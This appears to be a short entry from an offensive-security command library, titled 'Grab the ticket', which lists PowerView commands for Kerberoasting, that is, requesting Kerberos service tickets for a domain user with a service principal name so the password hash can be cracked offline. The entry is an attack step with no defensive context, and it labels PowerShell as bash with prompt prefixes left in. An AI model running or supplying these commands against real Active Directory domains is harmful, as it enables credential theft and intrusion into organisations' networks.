---
id: 905e43bd-76b5-41ba-b5bf-968cfbf222ee
name: Grab the ticket
type: command
executor: bash
data: "$User = Get-DomainUser username \nPowerView2 > $User | Get-DomainSPNTicket\
  \ | fl\nPowerView2 > $User | Select serviceprincipalname"
output: null
created_at: '2023-04-06T03:56:06.700832+00:00'
updated_at: '2023-04-10T20:26:07.517652+00:00'
---

# Grab the ticket

```bash
$User = Get-DomainUser username 
PowerView2 > $User | Get-DomainSPNTicket | fl
PowerView2 > $User | Select serviceprincipalname
```


